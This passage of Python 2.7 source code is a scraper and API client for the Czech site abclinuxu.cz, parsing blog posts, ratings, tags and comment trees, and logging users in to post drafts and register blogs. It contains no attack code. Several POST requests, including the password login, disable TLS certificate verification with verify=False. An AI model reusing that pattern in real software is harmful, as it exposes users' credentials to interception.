    You can pass `progress_fn` function to track progress of the binary search.

    Args:
        progress_fn (fn): Function accepting one parameter (current estimate).

    Returns:
        int: Number of published blogposts.
    """
    def test_end_of_bloglist(pagination):
        url = _shared.url_context("/blog/?from=%d" % (pagination * 25))
        data = _shared.download(url)
        dom = _dhtmlparser.parseString(_remove_crap_from_bloglist(data))

        if progress_fn:
            progress_fn(pagination)

        return _should_continue(dom)

    # 807 as of 20.02.2018
    estimated_max_no_blogs = (time.localtime().tm_year - 2000) * 50 + 100

    return _binary_search(0, estimated_max_no_blogs, test_end_of_bloglist)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import time
import copy
from collections import namedtuple

import dhtmlparser
from repoze.lru import lru_cache

from shared import first
from shared import download
from shared import url_context
from shared import parse_timestamp
from comment import Comment


# Blogs so fucked up, that they are not even parsable
COMMENT_BANLIST = {
    "/blog/Strider_BSD_koutek/2006/8/objevil-jsem-ameriku",
}


class Rating(namedtuple("Rating", ["rating", "base"])):
    """
    Container holding informations about rating.

    Attributes:
        rating (int): Percentual rating of the blogpost.
        base (int): How many people voted.
    """
    def __repr__(self):
        return "%s(%d%%@%d)" % (
            self.__class__.__name__,
            self.rating,
            self.base
        )


class Tag(str):
    """
    Each blog may have many tags. This is container for informations about each
    tag.

    Attributes:
        tag (str): Human readable content of the tag.
        norm (str): Machine-readable version of tag.
    """
    def __new__(self, tag, *args, **kwargs):
        return super(Tag, self).__new__(self, tag)

    def __init__(self, tag, norm=None):
        super(Tag, self).__init__(tag)

        self.tag = tag
        self.norm = norm

    @property
    def url(self):
        return url_context("/stitky/%s" % self.norm)


class Blogpost(object):
    """
    Informations about blogposts.

    Attributes:
        url (str): Absolute URL of the blogpost.
        uid (int): Unique identificator of the blogpost.
        title (str): Tile of the blogpost.
        intro (str): Perex. This is parsed only when returned from
                     :class:`User`.
        text (str): Full text of the blogpost.
        tags (list): List of :class:`Tag` objects.
        rating (obj): :class:`Rating` object with informations about rating.
        has_tux (bool): Does this blog have a tux? Only good blogs get tux.
        comments (list): List of :class:`.Comment` objects. Not used until
                 :meth:`.pull` is called, or `lazy` parameter of
                 :meth:`__init__` is set to ``True``.
        comments_n (int): Number of comments. This information is in some cases
                   known before the blog is parsed, just from perex.
        readed (int): How many times was the blog readed?
        object_ts (int): Timestamp of the creation of this object.
        created_ts (int): Timestamp of the creation of the blogpost.
        last_modified_ts (int): Timestamp of the last modification of blogpost.
    """
    def __init__(self, url, lazy=True, **kwargs):
        """
        Args:
            url (str): Url of the blogpost.
            lazy (bool, default True): True == don't call :meth:`pull` right
                 now.
        """
        self.url = url

        self.uid = None
        self.title = None
        self.intro = None
        self.text = None

        self.rating = None
        self.has_tux = False
        self.comments = []
        self.comments_n = -1
        self.readed = None

        self.object_ts = time.time()
        self.created_ts = None
        self.last_modified_ts = None

        # those are used for caching to speed up parsing
        self._tags = None
        self._dom = None
        self._content_tag = None

        # read parameters from kwargs
        for key, val in kwargs.iteritems():
            if key not in self.__dict__:
                raise TypeError("Unknown parameter `%s`!" % key)

            if key.startswith("_"):
                raise ValueError("You can't set protected/private properties!")

            self.__dict__[key] = val

        if not lazy:
            self.pull()

    @staticmethod
    def _parse_intro(blog, meta, title_tag):
        """
        Parse intro from the `meta` HTML part.
        """
        intro = blog.getContent().replace(str(meta), "")
        intro = intro.replace(str(title_tag), "")

        signature = blog.find("div", {"class": "signature"})
        if signature:
            intro = intro.replace(str(signature[0]), "")

        return dhtmlparser.removeTags(intro.strip()).strip()

    @staticmethod
    def _parse_comments_n(meta):
        """
        Parse number of comments under the blogpost.

        Args:
            meta (str): Meta html from the blogpost body.

        Returns:
            int: Number of comments.
        """
        comments = meta.find("a")[-1].getContent()

        try:
            comments = comments.split("&nbsp;")[1]
        except IndexError:
            return 0

        return int(comments)

    @staticmethod
    def _parse_rating_from_preview(meta):
        """
        Parse rating of the blogpost.

        Args:
            meta (str): Meta html from the blogpost body.

        Returns:
            Rating: :class:`.Rating` object.
        """
        rating = filter(
            lambda x: "Hodnocení:" in x,
            str(meta).splitlines()
        )

        if rating:
            rating = rating[0].strip().replace("(", "")
            rating = rating.split("&nbsp;")

            return Rating(int(rating[1]), int(rating[3]))

    @staticmethod
    def _parse_tags(tags_xml):
        tags_dom = dhtmlparser.parseString(tags_xml)

        # see http://www.abclinuxu.cz/ajax/tags/list for details
        return [
            Tag(tag.params["l"], tag.params["i"])
            for tag in tags_dom.find("s")
        ]

    @staticmethod
    def from_html(html, lazy=True):
        """
        Convert HTML string to :class:`Blogpost` instance.

        Args:
            html (str): Input data.
            lazy (bool, default True): Be lazy (don't pull data by yourself
                 from the site). Call :meth:`pull` for active download of all
                 required informations.

        Returns:
            obj: :class:`Blogpost` instance.
        """
        if not isinstance(html, dhtmlparser.HTMLElement):
            html = dhtmlparser.parseString(html)
            dhtmlparser.makeDoubleLinked(html)

        # support for legacy blogs
        title_tag = html.find("h2", {"class": "st_nadpis"})
        if title_tag:
            title_tag = first(title_tag)
            rel_link = first(title_tag.find("a")).params["href"]
            link = url_context(rel_link)
        else:
            title_tag = first(html.find("h2"))
            link = first(html.find("link", {"rel": "canonical"}))
            link = link.params["href"]

        title = dhtmlparser.removeTags(title_tag).strip()

        # get meta
        meta = html.find("p", {"class": "meta-vypis"})[0]

        blog = Blogpost(url=link, lazy=lazy)

        if lazy:
            blog.title = title
            blog.intro = Blogpost._parse_intro(html, meta, title_tag)
            blog.rating = Blogpost._parse_rating_from_preview(meta)
            blog.created_ts = parse_timestamp(meta)
            blog.comments_n = Blogpost._parse_comments_n(meta)

        return blog

    def _parse_title(self):
        assert self._dom

        title_tag = self._dom.find("title")

        if not title_tag:
            return

        self.title = first(title_tag).getContent()

    def _parse_content_tag(self):
        assert self._dom

        if self._content_tag:
            return self._content_tag

        content_tags = self._dom.find("div", {"class": "st", "id": "st"})
        if not content_tags:
            raise ValueError("Can't find content - is this really blogpost?")

        self._content_tag = first(content_tags)

        if not self._content_tag.isOpeningTag():
            self._content_tag = self._content_tag.parent

        return self._content_tag

    def _parse_text(self):
        content_tag = copy.deepcopy(self._parse_content_tag())

        # this shit is not structured in tree, so the parsing is little bit
        # hard
        h2_tag = first(content_tag.find("h2") + content_tag.find("h1"))
        rating_tag = first(content_tag.find("div", {"class": "rating"}))

        # throw everything until the h2_tag
        h2_parent = h2_tag.parent
        while h2_parent.childs[0] != h2_tag:
            h2_parent.childs.pop(0)

        # throw everything after the rating_tag
        rating_parent = rating_tag.parent
        while rating_parent.childs[-1] != rating_tag:
            rating_parent.childs.pop()

        # throw also the rating
        rating_parent.childs.pop()

        meta_vypis_tag = content_tag.find("p", {"class": "meta-vypis"})
        if meta_vypis_tag:
            content_tag.removeChild(meta_vypis_tag, end_tag_too=True)

        self.text = content_tag.getContent()

    def _parse_uid(self):
        def alt_uid():
            lines = self._dom.__str__().splitlines()

            # fined lines starting with Page.relationID
            # Page.relationID = 412659; -> 412659;
            relation_id = [
                line.split("=", 1)[-1]
                for line in lines
                if line.strip().startswith("Page.relationID")
            ]

            if not relation_id:
                return

            # ` 412659;` -> 412659
            relation_id = relation_id[0].split(";")[0].strip()

            self.uid = int(relation_id)

        content = self._parse_content_tag()
        rating_tags = content.find("div", {"class": "rating"})

        if not rating_tags:
            return alt_uid()

        a_tags = rating_tags[0].find(
            "a",
            fn=lambda x: x.params.get("href", "").startswith("/blog/rating/")
        )

        if not a_tags:
            return alt_uid()

        # <a href="/blog/rating/412659?action=rate&amp;rvalue=0&amp;
        # ticket=805cKn1vvI" target="rating" rel="nofollow">špatné</a>
        # -> /blog/rating/412659
        url = a_tags[0].params["href"].split("?")[0]

        # /blog/rating/412659 -> 412659
        url = url.split("/")[-1]

        # sometimes, there is something like ;jsessionid=bleh at the end
        # 400957;jsessionid=16k4zpu2a663zrcv87fe0zp0d -> 400957
        url = url.split(";")[0].strip()

        self.uid = int(url)

    def _parse_rating(self):
        content = self._parse_content_tag()
        rating_tags = content.find("div", {"class": "rating"})

        if not rating_tags:
            return

        # <span> with voting info
        voting_spans = first(rating_tags).find("span")

        if not voting_spans:
            return

        voting_span = first(voting_spans)

        rating = voting_span.getContent()
        base = voting_span.params.get("title", "0")

        self.rating = Rating(
            rating=int(rating.split()[0]),
            base=int(base.split()[-1]),
        )

    def _parse_meta(self):
        content = self._parse_content_tag()
        meta_vypis_tags = content.find("p", {"class": "meta-vypis"})

        if not meta_vypis_tags:
            return

        meta_vypis_tag = first(meta_vypis_tags)
        has_tux_tags = meta_vypis_tag.find("img", {"class": "blog_digest"})

        if has_tux_tags:
            self.has_tux = True

        # get clean string - another thing which is not semantic at all
        lines = dhtmlparser.removeTags(meta_vypis_tag)

        self.created_ts = parse_timestamp(lines)

        # rest will be picked one by one
        lines = lines.strip().splitlines()

        # parse last modification time
        modified_ts_line = [x for x in lines if "poslední úprava:" in x]
        if modified_ts_line:
            date_string = first(modified_ts_line).split(": ")[-1]
            self.last_modified_ts = parse_timestamp(date_string)

        # parse number of reads
        reads_line = [x for x in lines if "Přečteno:" in x]
        if reads_line:
            reads = first(reads_line).split(":")[-1].split("&")[0]
            self.readed = int(reads)

    @property
    def tags(self):
        if self._tags:
            return self._tags

        return self._get_tags()

    @tags.setter
    def tags(self, new_tags):
        self._tags = new_tags

    def _get_tags(self):
        # parse tags
        tags_url = "/ajax/tags/assigned?rid=%d" % self.uid
        tags_xml = download(url_context(tags_url))
        return self.__class__._parse_tags(tags_xml)

    @property
    @lru_cache(1)
    def relative_url(self):
        # http://abcl.cz/blog/2006/8/bleh#2 -> abcl.cz/blog/2006/8/bleh#2
        address = self.url.split("://")[-1]

        # abcl.cz/blog/2006/8/bleh#2 -> blog/2006/8/bleh#2
        relative_address = address.split("/", 1)[-1]

        # blog/2006/8/bleh#2 -> /blog/2006/8/bleh
        return "/" + relative_address.split("#")[0]

    def pull(self):
        """
        Download page with blogpost. Parse text, comments and everything else.

        Until this is called, following attributes are not known/parsed:

            - :attr:`text`
            - :attr:`tags`
            - :attr:`has_tux`
            - :attr:`comments`
            - :attr:`last_modified_ts`
        """
        data = download(url=self.url)

        # this is because of fucks who forgot to close elements like in this
        # blogpost: https://www.abclinuxu.cz/blog/EmentuX/2005/10/all-in-one
        blog_data, comments_data = data.split('<p class="page_tools">')

        self._dom = dhtmlparser.parseString(blog_data)
        self._content_tag = None
        dhtmlparser.makeDoubleLinked(self._dom)

        self._parse_uid()
        self._parse_title()
        self._parse_text()
        self._parse_rating()
        self._parse_meta()

        self._tags = self._get_tags()

        # there are blogs with fucked up HTML which is basically unparsable
        if self.relative_url not in COMMENT_BANLIST:
            self.comments = Comment.comments_from_html(comments_data)
            self.comments_n = len(self.comments)

        # memory cleanup - this saves a LOT of memory
        self._dom = None
        self._content_tag = None

    def get_image_urls(self):
        """
        Get list of links to all images used in this blog.

        Returns:
            list: List of str containing absolute URL of the image.
        """
        image_links = (
            image_tag.params["src"]
            for image_tag in dhtmlparser.parseString(self.text).find("img")
            if "src" in image_tag.params
        )

        def remote_link(link):
            return link.startswith("http://") or link.startswith("https://")

        return [
            link if remote_link(link) else url_context(link)
            for link in image_links
        ]

    # Tag handlers ============================================================
    @classmethod
    def possible_tags(cls):
        """
        Get list of all possible tags which may be set.

        Returns:
            list: List of :class:`Tag` objects.
        """
        tags_xml = download(url_context("/ajax/tags/list"))

        return cls._parse_tags(tags_xml)

    def add_tag(self, tag):
        """
        Add new tag to the blogpost.

        Args:
            tag (Tag): :class:`Tag` instance. See :class:`possible_tags` for
                list of all possible tags.

        Raises:
            KeyError: In case, that `tag` is not instance of :class:`Tag`.
            ValueError: In case that :attr:`uid` is not set.

        Returns:
            list: List of :class:`Tag` objects.
        """
        if not isinstance(tag, Tag):
            raise KeyError(
                "Tag have instance of Tag and to be from .possible_tags()"
            )

        if not self.uid:
            raise ValueError(
                "Can't assign tag - .uid property not set. Call .pull() or "
                "assign .uid manually."
            )

        tags_xml = download(url_context(
            "/ajax/tags/assign?rid=%d&tagID=%s" % (self.uid, tag.norm)
        ))

        self.tags = self.__class__._parse_tags(tags_xml)

        return self.tags

    def remove_tag(self, tag, throw=False):
        """
        Remove tag from the tags currently assigned to blogpost.

        Args:
            tag (Tag): :class:`Tag` instance. See :class:`possible_tags` for
                list of all possible tags.
            throw (bool): Raise error in case you are trying to remove
                tag that is not assigned to blogpost.

        Raises:
            KeyError: In case, that `tag` is not instance of :class:`Tag`.
            IndexError: In case that you are trying to remove tag which is not
                assigned to blogpost.
            ValueError: In case that :attr:`uid` is not set.

        Returns:
            list: List of :class:`Tag` objects.
        """
        if not isinstance(tag, Tag):
            raise KeyError(
                "Tag have instance of Tag and to be from .tags()"
            )

        if tag not in self.tags:
            if not throw:
                return self.tags

            raise IndexError("Can't remove unassigned tag.")

        if not self.uid:
            raise ValueError(
                "Can't assign tag - .uid property not set. Call .pull() or "
                "assign .uid manually."
            )

        tags_xml = download(url_context(
            "/ajax/tags/unassign?rid=%d&tagID=%s" % (self.uid, tag.norm)
        ))

        self.tags = self.__class__._parse_tags(tags_xml)

        return self.tags

    def __repr__(self):
        return "%s(%s)" % (self.__class__.__name__, self.title)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import copy
from collections import namedtuple

import dhtmlparser
from repoze.lru import lru_cache

from shared import first
from shared import url_context
from shared import date_izolator
from shared import parse_timestamp


class Comment(object):
    """
    Comment representation.

    Note:
        For registered users, the :attr:`username` property contains `real`
        username, which may differ from what you see, but this allows you to
        identify the user.

        This is because registered users can (and do) change their `visible`
        usernames anytime they want.

    Attributes:
        url (str): Absolute URL of the comment.
        text (str): Fulltext of the comment.
        timestamp (int): Date of the publication as timestamp.
        username (str): Username of the poster.
        registered (bool): Was the user registered?
        censored (bool): Is the comment censored? If so, you will need
                 additional parsing of the comment, which is not yet
                 implemented.
        responses (list): List of :class:`Comment` instances responding to this
                  comment.
        response_to (obj): Reference to :class:`Comment` to which you are
                    responding. ``None`` in cases where the object is at the
                    top of the comment tree.
    """
    def __init__(self):
        self._id = None

        self.url = None
        self.text = None
        self.timestamp = None

        self.username = None
        self.registered = False
        self.censored = False

        self.responses = []
        self.response_to = None

    @property
    @lru_cache(1)
    def id(self):
        """
        Returns:
            str: Identification of the comment.
        """
        # http://abclinuxu.cz/blog/msk/2016/8/hlada-sa-linux-embedded-vyvojar
        # doesn't have urls in comments, for fucks sake
        if self.url:
            return self.url.split("#")[-1]

        return self._id

    @staticmethod
    def _izolate_timestamp(head_tag):
        text_elements = head_tag.find(None, fn=lambda x: not x.isTag())

        text_clusters = [str(x).splitlines() for x in text_elements]
        lines = sum(text_clusters, [])  # flattern the list

        return parse_timestamp(lines)

    @staticmethod
    def _izolate_username(head_tag):
        user_tag = head_tag.find(
            "a",
            fn=lambda x: x.params.get("href", "").startswith("/lide/")
        )

        if user_tag:
            user_link = first(user_tag).params["href"]

            # /lide/manasekp -> manasekp
            real_username = user_link.split("/")[2]

            return real_username, True  # registered

        # parse unregistered username from unstructured HTML like:
        #         10.2. 21:53
        #
        #       Tomáškova máma

        str_repr = dhtmlparser.removeTags(head_tag.getContent())

        # remove blank lines
        lines = [x.strip() for x in str_repr.splitlines() if x.strip()]

        # izolate line with time
        line_with_time = first(date_izolator(lines))

        # pick line next to line with time
        username = lines[lines.index(line_with_time) + 1]

        def clean_username(username):
            if username == "Rozbalit":  # no username was found
                return ""

            return username.strip()

        return clean_username(username), False  # unregistered

    @staticmethod
    def _parse_url(head_tag):
        comment_id = head_tag.params["id"]

        # parse full link from
        # <a href="/blog/EditDiscussion/400959;jsessionid=kufis2spplnh6gu671mxq
        # e2j?action=add&amp;dizId=210591&amp;threadId=9">Odpovědět</a>
        response_tag = head_tag.find(
            "a",
            fn=lambda x: x.getContent() == "Odpovědět"
        )

        try:
            response_link = first(response_tag).params["href"]
        except StopIteration:
            return None

        # /blog/EditDiscussion/400959;jsessii... -> /blog/EditDiscussion/400959
        response_link = response_link.split(";")[0]

        # /blog/EditDiscussion/400959?action=a.. -> /blog/EditDiscussion/400959
        response_link = response_link.split("?")[0]

        # /blog/EditDiscussion/400959 -> 400959
        blog_id = first(
            token
            for token in response_link.split("/")
            if token.isdigit()
        )

        return url_context("/blog/show/%s#%s" % (blog_id, comment_id))

    @staticmethod
    def _response_to(head_tag):
        response_to_tag = head_tag.find(
            "a",
            fn=lambda x: x.getContent() == "Výše"
        )

        if not response_to_tag:
            return None

        # <a href="#2" title="...">Výše</a> -> #2
        response_to_link = first(response_to_tag).params["href"]

        # #2 -> 2
        return response_to_link.split("#")[-1]

    @staticmethod
    def _parse_text(body_tag):
        censored = False
        text_tag = body_tag.find("div", {"class": "ds_text"})

        if not text_tag:
            censored = True
            text_tag = body_tag.find("div", {"class": "cenzura"})

        if not text_tag:
            raise ValueError("Can't find comment body!")

        return first(text_tag).getContent().strip(), censored

    @staticmethod
    def _from_head_and_body(head_tag, body_tag, uid=None):
        """
        uid is optional, because it's used only at pages without comment links.
        See http://abclinuxu.cz/blog/msk/2016/8/hlada-sa-linux-embedded-vyvojar
        for details.
        """
        c = Comment()

        # fill object
        c._id = uid
        c.url = Comment._parse_url(head_tag)
        c.text, c.censored = Comment._parse_text(body_tag)
        c.response_to = Comment._response_to(head_tag)
        c.timestamp = Comment._izolate_timestamp(head_tag)
        c.username, c.registered = Comment._izolate_username(head_tag)

        return c

    @staticmethod
    def comments_from_html(html):
        """
        Parse comments in `html`, return list of connected :class:`Comment`
        instances.

        Args:
            html (str): Webpage for parsing.

        Returns:
            list: List of :class:`Comment` instances linked also into trees \
                  using :attr:`response_to` and :attr:`responses` properties.
        """
        def cut_dom_to_area_of_interest(html):
            """
            Raises:
                StopIteration: In case of no comments.
                ValueError: In case that there is missing elements from HTML.
            """
            dom = html

            # make sure, that you don't modify `html` parameter
            if not isinstance(html, dhtmlparser.HTMLElement):
                dom = dhtmlparser.parseString(html)
            else:
                dom = copy.deepcopy(dom)
            dhtmlparser.makeDoubleLinked(dom)

            # comments are not stored in hierarchical structure, but in somehow
            # flat-nested lists

            # locate end of article
            ds_toolbox = dom.find("div", {"class": "ds_toolbox"})

            if not ds_toolbox:
                # blogposts without any comments
                add_first_comment = dom.find(
                    "a",
                    fn=lambda x:
                        "action=addDiz" in x.params.get("href", "") and
                        x.getContent().strip() == "Vložit první komentář"
                )

                if add_first_comment:
                    raise StopIteration("No comments yet.")

                raise ValueError("Couldn't locate ds_toolbox!")

            ds_toolbox = first(ds_toolbox)
            dom = ds_toolbox.parent

            # ged rid of everything until end of the article
            while dom.childs[0] != ds_toolbox:
                dom.childs.pop(0)

            dom.childs.pop(0)

            return dom

        # pick all header divs
        def header_div_class(item):
            """
            Identify header dicts. Sometimes there is class="ds_hlavicka" and
            sometimes there is class="ds_hlavicka ds_hlavicka_me".
            """
            class_descr = item.params.get("class", "")

            return class_descr.startswith("ds_hlavicka")

        def id_from_comment_div(comment_div):
            # <div id="comment3"> -> 3
            id_str = comment_div.parent.params.get("id")

            # for details, see
            # http://abclinuxu.cz/blog/Mostly_IMDB/2008/6/radeon-hd-4850-a-tak-vubec#17
            if not id_str:
                id_str = comment_div.parent.parent.params.get("id")

            if not id_str:
                id_str = comment_div.parent.parent.parent.params["id"]

            return id_str.replace("comment", "")

        def comment_or_censored(tag):
            return tag.params.get("class", "") in ("ds_text", "cenzura")

        def parse_comments(dom, head_dict):
            IdBodyPair = namedtuple("IdBodyPairs", ["uid", "comment_div"])

            # I need to use the ID two times in the next pass, thats why
            id_body_pairs = (
                IdBodyPair(
                    uid=id_from_comment_div(comment_div),
                    comment_div=comment_div,
                )
                for comment_div in dom.find("div", fn=comment_or_censored)
            )

            return [
                Comment._from_head_and_body(
                    head_dict[uid],
                    comment_div,
                    uid,
                )
                for uid, comment_div in id_body_pairs
            ]

        try:
            dom = cut_dom_to_area_of_interest(html)
        except StopIteration:
            return []

        head_dict = {
            head_div.params["id"]: head_div
            for head_div in dom.find("div", fn=header_div_class)
            if "id" in head_div.params
            # if condition because of
            # /blog/leos/2007/2/prepis-diskusniho-fora-hw-sekce#31
        }

        comment_list = parse_comments(dom, head_dict)

        # {id: comment}
        comment_dict = {
            comment.id: comment
            for comment in comment_list
        }

        # link comments into tree
        for comment in comment_list:
            if comment.response_to:
                comment.response_to = comment_dict[comment.response_to]
                comment.response_to.responses.append(comment)

        return comment_list

    def __repr__(self):
        return "Comment(username=%s, id=%s)" % (self.username, self.id)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from urlparse import urljoin

import requests
import dhtmlparser

import shared
from shared import first
from shared import url_context
from shared import ABCLINUXU_URL
from shared import check_error_div

from concept import Concept
from blogpost import Blogpost


# Variables ===================================================================
BLOG_STEP = 50  # Sets how much blogpost can be at one page


# Functions & classes =========================================================
class User(object):
    """
    Class that is used to hold informations about given `username`. You can
    also command various operations, like get list of all blogs, or add new
    concept.

    Attributes:
        username (str):
        password (str, default None): Password for logged user.
        logged_in (bool): Is the user logged in?
    """
    def __init__(self, username, password=None, lazy=False):
        """
        Args:
            username (str): Users login.
            password (str, default None): Optional password for given user.
                     This will allow you to upload concepts.
            lazy (bool, default False): Don't call :meth:`lazy_init` right when
                 the object is created.
        """
        self.username = username
        self.password = password
        self.logged_in = False

        self.session = requests.Session()
        self.blog_url = None
        self._user_id = None

        if not lazy:
            self.lazy_init()

    @property
    def has_blog(self):
        """
        Does the user have registered blog?
        """
        return self.blog_url is not None

    def lazy_init(self):
        """
        Parse additional informations about user. This step require one request
        to the site.
        """
        self.blog_url = self._parse_blogname()

    @staticmethod
    def from_user_id(user_id):
        """
        Transform `user_id` to instance of :class:`User`.

        Returns:
            obj: :class:`User` instance parsed from the `user_id`.
        """
        data = shared.download(url_context("/Profile/" + str(user_id)))
        dom = dhtmlparser.parseString(data)
        dhtmlparser.makeDoubleLinked(dom)

        shared.handle_errors(dom)

        # <li><a href="/lide/unittest/objekty" rel="nofollow">Seznam příspěvků
        # na abclinuxu.cz</a>
        a_tags = dom.find(
            "a",
            fn=lambda x: x.params.get("href", "").startswith("/lide/")
        )

        # pick only links which have content that starts with Seznam
        links = [
            a_tag.params["href"]
            for a_tag in a_tags
            if a_tag.getContent().startswith("Seznam")
        ]

        username = links[-1].split("/")[2]

        return User(username)

    def _get_user_id(self):
        """
        Resolve user's ID number for logged user.

        Returns:
            str: USER id as string.
        """
        if self._user_id is not None:
            return self._user_id

        self.login()
        dom = dhtmlparser.parseString(self._get(ABCLINUXU_URL))

        # resolve user's navigation panel
        nav_bar = dom.match(
            ["div", {"class": "hl_vpravo"}],
            {
                "tag_name": "a",
                "fn": lambda x: x.params.get("href", "").startswith("/Profile")
            }
        )

        if not nav_bar:
            raise ValueError("Can't parse user's navigation bar!")

        profile_link = first(nav_bar).params["href"]

        # transform /Profile/24642?action=myPage -> 24642
        self._user_id = profile_link.split("?")[0].split("/")[-1]

        return self._user_id

    def _compose_profile_url(self):
        return urljoin(ABCLINUXU_URL, urljoin("/lide/", self.username))

    def _parse_blogname(self):
        data = self._get(self._compose_profile_url())

        dom = dhtmlparser.parseString(data)
        blogname = filter(
            lambda x: x.getContent().strip().startswith("Můj blog: "),
            dom.find("h2")
        )

        if not blogname:
            return None

        links = blogname[0].find("a")

        if not links:
            raise UserWarning("Can't find blog link!")

        return urljoin(ABCLINUXU_URL, links[0].params["href"])

    def _get(self, url, params=None, as_text=True):
        """
        Shortcut for ``self.session.get().text.encode("utf-8")``.

        Args:
            url (str): Url on which the GET request will be sent.
            params (dict): GET parameters.
            as_text (bool, default True): Return result as text or binary data.

        Returns:
            str/binary data: depending on the `as_text` parameter.
        """
        return shared.download(
            url=url,
            params=params,
            session=self.session,
            as_text=as_text
        )

    def login(self, password=None):
        """
        Logs the user in, tests, if the user is really logged.

        Args:
            password (str, default None): Password, overwrites the password set
                     when the object was created.

        Raises:
            UserWarning: if there was some error during login.
        """
        if self.logged_in:
            return

        if password is not None:
            self.password = password

        if self.password is None:
            raise UserWarning("Invalid password.")

        login_url = urljoin(ABCLINUXU_URL, "/Profile")
        data = self.session.post(
            login_url,
            data={
                "finish": "Přihlásit",
                "LOGIN": self.username,
                "PASSWORD": self.password,
                "noCookie": "no",
                "useHttps": "yes" if login_url.startswith("https") else "no",
                "action": "login2",
                "url": "http://www.abclinuxu.cz/"
            },
            verify=False,
        ).text.encode("utf-8")

        # test, whether the user is successfully logged in
        dom = dhtmlparser.parseString(data)

        logged_in = dom.find("div", {"class": "hl"})
        if not logged_in:
            raise UserWarning("Bad username/password!")

        logged_in = logged_in[0].find("div", {"class": "hl_vpravo"})
        if not logged_in:
            raise UserWarning("Bad username/password!")

        logged_in = logged_in[0].find("a")[-1]
        if not logged_in or logged_in.getContent() != "Odhlásit":
            raise UserWarning("Bad username/password!")

        self.logged_in = True

    def _compose_blogposts_url(self, from_counter):
        return urljoin(self.blog_url, "?from=%d" % from_counter)

    def get_blogposts(self):
        """
        Lists all of users PUBLISHED blogposts. For unpublished, see 
        :meth:`get_concepts`.

        Returns:
            list: sorted (old->new) list of Blogpost objects.
        """
        if not self.has_blog:
            return []

        def cut_crap(data):
            data = data.split(
                '<div class="s_nadpis linkbox_nadpis">Píšeme jinde</div>'
            )[0]

            return data.split('<div class="st" id="st">')[1]

        cnt = 0
        posts = []
        parsed = [1]  # just placeholder for first iteration
        while parsed:
            data = self._get(self._compose_blogposts_url(cnt))

            dom = dhtmlparser.parseString(cut_crap(data))
            parsed = [
                Blogpost.from_html(blog_html)
                for blog_html in dom.find("div", {"class": "cl"})
            ]

            posts.extend(parsed)
            cnt += BLOG_STEP

        return sorted(posts, key=lambda x: x.created_ts)

    def get_concepts(self):
        """
        Return all concepts (unpublished blogs).

        Returns:
            list: List of Concept objects.
        """
        if not self.has_blog:
            raise ValueError("User doesn't have blog!")

        self.login()

        # get the fucking untagged part of the site, where the links to the
        # concepts are stored
        data = self._get(self.blog_url)

        if '<div class="s_nadpis">Rozepsané zápisy</div>' not in data:
            return []

        data = data.split('<div class="s_nadpis">Rozepsané zápisy</div>')[1]

        dom = dhtmlparser.parseString(data)
        concept_list = dom.find("div", {"class": "s_sekce"})[0]

        # links to concepts are stored in <li>
        concepts = []
        for li in concept_list.find("li"):
            a = li.find("a")[0]

            concepts.append(
                Concept(
                    title=a.getContent().strip(),
                    link=a.params["href"],
                    session=self.session
                )
            )

        return concepts

    def add_concept(self, text, title, ts_of_pub=None):
        """
        Adds new concept into your concepts.

        Args:
            text (str): Text of your concept.
            title (str): Title of your contept. Do not use HTML in title!
            ts_of_pub (int/float, default None): Timestamp of the publication.

        Raises:
            UserWarning: if the site is broken or user was logged out.
        """
        if not self.has_blog:
            raise ValueError("User doesn't have blog!")

        self.login()

        dom = dhtmlparser.parseString(self._get(self.blog_url))

        # get section with links to new blog
        s_sekce = filter(
            lambda x: "Vlož nový zápis" in x.getContent(),
            dom.find("div", {"class": "s_sekce"})
        )
        if not s_sekce:
            raise UserWarning("Can't resolve right div tag!")

        # get link to "add blog" page
        add_blog_link = filter(
            lambda x: "href" in x.params and
                      x.params["href"].endswith("action=add"),
            s_sekce[0].find("a")
        )
        if not add_blog_link:
            raise UserWarning("Can't resolve user number!")
        add_blog_link = add_blog_link[0].params["href"]

        # get "add blog" page
        data = self._get(ABCLINUXU_URL + add_blog_link)
        dom = dhtmlparser.parseString(data)

        form_action = dom.find("form", {"name": "form"})[0].params["action"]

        data = self.session.post(
            ABCLINUXU_URL + form_action,
            data={
                "cid": 0,
                "publish": shared.ts_to_concept_date(ts_of_pub),
                "content": text,
                "title": dhtmlparser.removeTags(title),
                "delay": "Do konceptů",
                "action": "add2"
            },
            verify=False,
        )
        data = data.text.encode("utf-8")
        check_error_div(data, '<div class="error" id="contentError">')
        check_error_div(data, '<div class="error" id="titleError">')

    def register_blog(self, blog_name):
        """
        Register blog under `blog_name`. Users doesn't have blogs
        automatically, you have to create them manually.

        Raises:
            UserWarning: If user already have blog registered.
            ValueError: If it is not possible to register blog for user (see \
                        exception message for details).
        """
        if self.has_blog:
            raise UserWarning("User already have blog!")

        add_blog_url = urljoin(
            ABCLINUXU_URL,
            urljoin("/blog/edit/", self._get_user_id())
        )

        data = self.session.post(
            add_blog_url,
            params={
                "blogName": blog_name,
                "category1": "",
                "category2": "",
                "category3": "",
                "action": "addBlog2",
            },
            verify=False,
        )

        # check for errors
        dom = dhtmlparser.parseString(data.text.encode("utf-8"))
        errors = dom.find("p", {"class": "error"})
        if errors:
            raise ValueError(first(errors).getContent())

        self.blog_url = self._parse_blogname()

        if not self.has_blog:
            raise ValueError("Couldn't register new blog.")

    def __iter__(self):
        for blog in self.get_blogposts():
            yield blog

    def __repr__(self):
        return "%s(%s)" % (self.__class__.__name__, self.username)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import re
import time
import types
import datetime
from urlparse import urljoin

import requests
import dhtmlparser


# Variables ===================================================================
ABCLINUXU_URL = "https://www.abclinuxu.cz"  #: Base URL of the abclinuxu.
SESSION = requests.Session()  #: Session which is used in non-private requests.


# Functions & classes =========================================================
def download(url, params=None, method="GET", session=None, as_text=True,
             data=None):
    """
    Download data from `url` using `method`. Send `params` if defined.

    Args:
        url (str): Absolute URL from which the data will be downloaded.
        params (dict, default None): Send parameters (GET/POST).
        data (dict, default None): Data which will be sent as body of the
             request.
        method (str, default "GET"): Use this method to send the request.
        session (obj, default None): If ``None``, shared :attr:`SESSION` object
                is used.
        as_text (bool, default True): Return content as ``UTF-8`` encoded
                string. If false ``bytes`` are returned.

    Returns:
        str/bytes: Content depending on the `as_text` attribute.
    """
    if session is None:
        session = SESSION

    content = session.request(
